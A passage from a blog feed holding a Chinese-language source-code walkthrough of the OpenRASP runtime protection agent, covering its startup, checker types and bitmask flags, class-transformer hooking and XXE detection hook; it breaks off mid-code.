href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/03.%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01.log4j%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">01.log4j反序列化漏洞分析 · d4m1ts 知识库 (gm7.org)</a></p><p><a href="https://www.ctfiot.com/37450.html">CodeQL能找到log4shell(CVE-2021-44228)漏洞吗？ | CTF导航 (ctfiot.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OpenRASP源码阅读</title>
    <link href="/decemberus.com/2023/12/17/OpenRASP%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    <url>/decemberus.com/2023/12/17/OpenRASP%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="OpenRASP源码阅读"><a href="#OpenRASP源码阅读" class="headerlink" title="OpenRASP源码阅读"></a>OpenRASP源码阅读</h1><h2 id="启动工作"><a href="#启动工作" class="headerlink" title="启动工作"></a>启动工作</h2><p>主要的启动类位于这里</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20240302132620164.png" alt="image-20240302132620164"></p><p>整个过程的调用栈基本如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">EngineBoot#start<br>EngineBoot#initTransformer<br>CustomClassTransformer#<br>CustomClassTransformer#addAnnotationHook<br>CustomClassTransformer#retransform<br>CustomClassTransformer#transform<br>AbstractClassHook#transformClass<br><br></code></pre></td></tr></table></figure><h3 id="一些基本的加载"><a href="#一些基本的加载" class="headerlink" title="一些基本的加载"></a>一些基本的加载</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadConfig</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    LogConfig.ConfigFileAppender();<br>    <span class="hljs-comment">//单机模式下动态添加获取删除syslog</span><br>    <span class="hljs-keyword">if</span> (!CloudUtils.checkCloudControlEnter()) &#123;<br>        LogConfig.syslogManager();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;[OpenRASP] RASP ID: &quot;</span> + CloudCacheModel.getInstance().getRaspId());<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>LogConfig.ConfigFileAppender()：初始化log4j<br>CloudUtils.checkCloudControlEnter()：检查云控配置信息<br>LogConfig.syslogManager()：读取配置信息，初始化syslog服务连接</p><h3 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h3><p>往上面看能够看到一个js.Initialize,它用来为V8配置java的logger以及栈堆信息Getter（用于在js中获取当前栈堆信息）</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-comment">// 初始化插件系统</span><br><span class="hljs-keyword">if</span> (!JS.Initialize()) &#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>那些关系不大的类就不去了解了，主要来看一个重要的地方，在主函数中有下面这个语句初始化所有的checker，从枚举类<code>com.baidu.openrasp.plugin.checker.CheckParameter.Type</code>中读取所有的checker，</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">CheckerManager.init()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>而他创建了一个枚举map</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> CheckerManager &#123;<br><br>    private static EnumMap&lt;<span class="hljs-keyword">Type</span>, Checker&gt; checkers = <span class="hljs-built_in">new</span> EnumMap&lt;<span class="hljs-keyword">Type</span>, Checker&gt;(<span class="hljs-keyword">Type</span>.<span class="hljs-keyword">class</span>);<br><br>    <span class="hljs-built_in">public</span> synchronized static <span class="hljs-type">void</span> init() throws <span class="hljs-keyword">Exception</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">Type</span> <span class="hljs-keyword">type</span> : <span class="hljs-keyword">Type</span>.<span class="hljs-keyword">values</span>()) &#123;<br>            checkers.put(<span class="hljs-keyword">type</span>, <span class="hljs-keyword">type</span>.checker);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个map里面存在有各种类型的注入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Type</span> &#123;<br>    <span class="hljs-comment">// js插件检测</span><br>    SQL(<span class="hljs-string">&quot;sql&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span>),<br>    COMMAND(<span class="hljs-string">&quot;command&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>),<br>    DIRECTORY(<span class="hljs-string">&quot;directory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>),<br>    REQUEST(<span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>),<br>    READFILE(<span class="hljs-string">&quot;readFile&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>),<br>    WRITEFILE(<span class="hljs-string">&quot;writeFile&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>),<br>    FILEUPLOAD(<span class="hljs-string">&quot;fileUpload&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>),<br>    RENAME(<span class="hljs-string">&quot;rename&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>),<br>    XXE(<span class="hljs-string">&quot;xxe&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">9</span>),<br>    OGNL(<span class="hljs-string">&quot;ognl&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">10</span>),<br>    DESERIALIZATION(<span class="hljs-string">&quot;deserialization&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">11</span>),<br>    WEBDAV(<span class="hljs-string">&quot;webdav&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">12</span>),<br>    INCLUDE(<span class="hljs-string">&quot;include&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">13</span>),<br>    SSRF(<span class="hljs-string">&quot;ssrf&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">14</span>),<br>    SQL_EXCEPTION(<span class="hljs-string">&quot;sql_exception&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">15</span>),<br>    REQUESTEND(<span class="hljs-string">&quot;requestEnd&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">17</span>),<br>    DELETEFILE(<span class="hljs-string">&quot;deleteFile&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">18</span>),<br>    MONGO(<span class="hljs-string">&quot;mongodb&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">19</span>),<br>    LOADLIBRARY(<span class="hljs-string">&quot;loadLibrary&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>),<br>    SSRF_REDIRECT(<span class="hljs-string">&quot;ssrfRedirect&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">21</span>),<br>    RESPONSE(<span class="hljs-string">&quot;response&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>),<br>    LINK(<span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">24</span>),<br>    JNDI(<span class="hljs-string">&quot;jndi&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">25</span>),<br>    DNS(<span class="hljs-string">&quot;dns&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">V8AttackChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">26</span>),<br><br><br>    <span class="hljs-comment">// java本地检测</span><br>    XSS_USERINPUT(<span class="hljs-string">&quot;xss_userinput&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">XssChecker</span>(), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>),<br>    SQL_SLOW_QUERY(<span class="hljs-string">&quot;sqlSlowQuery&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlResultChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br><br>    <span class="hljs-comment">// 安全基线检测</span><br>    POLICY_LOG(<span class="hljs-string">&quot;log&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">22</span>),<br>    POLICY_MONGO_CONNECTION(<span class="hljs-string">&quot;mongoConnection&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MongoConnectionChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SQL_CONNECTION(<span class="hljs-string">&quot;sqlConnection&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SqlConnectionChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_TOMCAT(<span class="hljs-string">&quot;tomcatServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TomcatSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_JBOSS(<span class="hljs-string">&quot;jbossServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JBossSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_JBOSSEAP(<span class="hljs-string">&quot;jbossEAPServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JBossEAPSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_JETTY(<span class="hljs-string">&quot;jettyServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JettySecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_RESIN(<span class="hljs-string">&quot;resinServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResinSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_WEBSPHERE(<span class="hljs-string">&quot;websphereServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebsphereSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_WEBLOGIC(<span class="hljs-string">&quot;weblogicServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeblogicSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_WILDFLY(<span class="hljs-string">&quot;wildflyServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">WildflySecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_TONGWEB(<span class="hljs-string">&quot;tongwebServer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TongwebSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>),<br>    POLICY_SERVER_BES(<span class="hljs-string">&quot;bes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">BESSecurityChecker</span>(<span class="hljs-literal">false</span>), <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>包含三种类型的checker，一是js插件检测，意味着这个checker会调用js plugin进行攻击检测，二是java本地检测，意味着是调用本地java代码进行攻击检测，三是安全基线检测，是用于检测一些高风险类的安全性基线检测，检测其配置是否有安全隐患。</p><p>而这些位移就是位掩码来在一个整数中独立开启或关闭多个标志位</p><p>比如这样</p><blockquote><p>如果配置值是 <code>3</code>（二进制 <code>11</code>），那么表示启用了 <code>SQL</code> 和 <code>COMMAND</code> 两种检测。</p><p>具体到这段代码，位数代表了每种检测类型的唯一标识符。例如：</p><ul><li><code>SQL</code> 的位掩码是 <code>1</code>（二进制 <code>0001</code>）。</li><li><code>COMMAND</code> 的位掩码是 <code>1 &lt;&lt; 1</code> 或 <code>2</code>（二进制 <code>0010</code>）。</li><li><code>DIRECTORY</code> 的位掩码是 <code>1 &lt;&lt; 2</code> 或 <code>4</code>（二进制 <code>0100</code>）。</li></ul></blockquote><h3 id="initTransformer"><a href="#initTransformer" class="headerlink" title="initTransformer"></a>initTransformer</h3><p>主要的方法为这个</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">initTransformer(inst);<br></code></pre></td></tr></table></figure><p>进入了这个方法以后，会进入我们CustomClassTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initTransformer</span><span class="hljs-params">(Instrumentation inst)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException &#123;<br>    transformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomClassTransformer</span>(inst);<br>    transformer.retransform();<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个类中，能够进行字节码的修改，并且添加hook注解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomClassTransformer</span><span class="hljs-params">(Instrumentation inst)</span> &#123;<br>    <span class="hljs-built_in">this</span>.inst = inst;<br>    inst.addTransformer(<span class="hljs-built_in">this</span>, <span class="hljs-literal">true</span>);<br>    addAnnotationHook();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addAnnotationHook</span><span class="hljs-params">()</span> &#123;<br>    Set&lt;Class&gt; classesSet = AnnotationScanner.getClassWithAnnotation(SCAN_ANNOTATION_PACKAGE, HookAnnotation.class);<span class="hljs-comment">//扫描特定包名下的含有特定的注解的类，这里就是扫描带有hookannotation的类</span><br>    <br>    <span class="hljs-keyword">for</span> (Class clazz : classesSet) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> clazz.newInstance();<br>            <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> AbstractClassHook) &#123;<br>                addHook((AbstractClassHook) object, clazz.getName());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            LogTool.error(ErrorType.HOOK_ERROR, <span class="hljs-string">&quot;add hook failed: &quot;</span> + e.getMessage(), e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>addAnnotationHook()读取了com.baidu.openrasp.hook包中所有被@HookAnnotation注解的class，然后缓存到集合hooks中，判断该对象是否是AbstractClassHook的子类，如果是，就调用addHook方法，传入该对象和该类的名称两个参数，将该对象作为一个hook添加到HookHandler中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransform</span><span class="hljs-params">()</span> &#123;<br>    LinkedList&lt;Class&gt; retransformClasses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedList</span>&lt;Class&gt;();<br>    Class[] loadedClasses = inst.getAllLoadedClasses();<br>    <span class="hljs-keyword">for</span> (Class clazz : loadedClasses) &#123;<br>        <span class="hljs-keyword">if</span> (isClassMatched(clazz.getName().replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>))) &#123;<br>            <span class="hljs-keyword">if</span> (inst.isModifiableClass(clazz) &amp;&amp; !clazz.getName().startsWith(<span class="hljs-string">&quot;java.lang.invoke.LambdaForm&quot;</span>)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-comment">// hook已经加载的类，或者是回滚已经加载的类</span><br>                    inst.retransformClasses(clazz);<br>                &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>                    LogTool.error(ErrorType.HOOK_ERROR,<br>                            <span class="hljs-string">&quot;failed to retransform class &quot;</span> + clazz.getName() + <span class="hljs-string">&quot;: &quot;</span> + t.getMessage(), t);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会从所有在CustomClassTransformer中加载的类里面找到匹配的hook类，然后判断类是否可以修改，并且排除lambda表达式生成的类，最后就可以进行hook已经加载的类了</p><p>如此一来，后续类加载通过com.baidu.openrasp.transformer.CustomClassTransformer#transform的时候，对其进行匹配，判断是否需要hook</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,<br>                        ProtectionDomain domain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br>    <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;<br>        DependencyFinder.addJarPath(domain);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span> &amp;&amp; jspClassLoaderNames.contains(loader.getClass().getName())) &#123;<br>        jspClassLoaderCache.put(className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoftReference</span>&lt;ClassLoader&gt;(loader));<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">final</span> AbstractClassHook hook : hooks) &#123;<br>        <span class="hljs-keyword">if</span> (hook.isClassMatched(className)) &#123;<span class="hljs-comment">//这里的hook就是从前面的hook中得到的</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>                addLoader(classPool, loader);<span class="hljs-comment">//加上loader对应的路径</span><br>                ctClass = classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(classfileBuffer));<br>                <span class="hljs-keyword">if</span> (loader == <span class="hljs-literal">null</span>) &#123;<br>                    hook.setLoadedByBootstrapLoader(<span class="hljs-literal">true</span>);<br>                &#125;<br>                classfileBuffer = hook.transformClass(ctClass);<span class="hljs-comment">//对ctclass进行转换，修改类的字节码，agent的内容加到hook的前面</span><br>                <span class="hljs-keyword">if</span> (classfileBuffer != <span class="hljs-literal">null</span>) &#123;<br>                    checkNecessaryHookType(hook.getType());<span class="hljs-comment">//检查是否是hook类型</span><br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (ctClass != <span class="hljs-literal">null</span>) &#123;<br>                    ctClass.detach();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    serverDetector.detectServer(className, loader, domain);<br>    <span class="hljs-keyword">return</span> classfileBuffer;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="主要hook类分析"><a href="#主要hook类分析" class="headerlink" title="主要hook类分析"></a>主要hook类分析</h2><p>所有的hook类都实现了AbstractClassHook这一个类，这个类主要用来检测hook类的各种参数的</p><h3 id="XXEHook"><a href="#XXEHook" class="headerlink" title="XXEHook"></a>XXEHook</h3><p>我们直接来分析engine中的XXEHook，主要的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkXXE</span><span class="hljs-params">(String expandedSystemId)</span> &#123;<br>    <span class="hljs-keyword">if</span> (expandedSystemId != <span class="hljs-literal">null</span> &amp;&amp; !XXEHook.getLocalExpandedSystemIds().contains(expandedSystemId)) &#123;<br>        XXEHook.getLocalExpandedSystemIds().add(expandedSystemId);<br>        HashMap&lt;String, Object&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        params.put(<span class="hljs-string">&quot;entity&quot;</span>, expandedSystemId);<br>        HookHandler.doCheck(CheckParameter.Type.XXE, params);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的expandedSystemId是代表了XML文档中外部实体的系统标识符（System Identifier），如果文档包含了对外部资源的引用，解析器会尝试通过这个系统标识符来获取外部资源。</p><p>第一行就是为了先检测有没有被记录在本地的<code>localExpandedSystemIds</code>，可以往上面看这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> 当前线程已触发检测的expandedSystemIds</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashSet&lt;String&gt; <span class="hljs-title function_">getLocalExpandedSystemIds</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> localExpandedSystemIds.get();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 重置当前线程已触发检测的expandedSystemIds</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">resetLocalExpandedSystemIds</span><span class="hljs-params">()</span> &#123;<br>    localExpandedSystemIds.get().clear();<br>&#125;<br></code></pre></td></tr></table></figure><p>它会检查每个<code>expandedSystemId</code> 是否已经被记录在一个hashset中。如果没有，它会将这个新的<code>expandedSystemId</code> 添加到hashset中，并通过 <code>HookHandler.doCheck</code> 方法来进行安全检查，以确保这个外部实体的引用不会导致安全问题</p><p>我们接着往上看hookMethod</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hookMethod</span><span class="hljs-params">(CtClass ctClass)</span> <span class="hljs-keyword">throws</span> IOException, CannotCompileException, NotFoundException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">src</span> <span class="hljs-operator">=</span> getInvokeStaticSrc(XXEHook.class, <span class="hljs-string">&quot;checkXXE&quot;</span>, <span 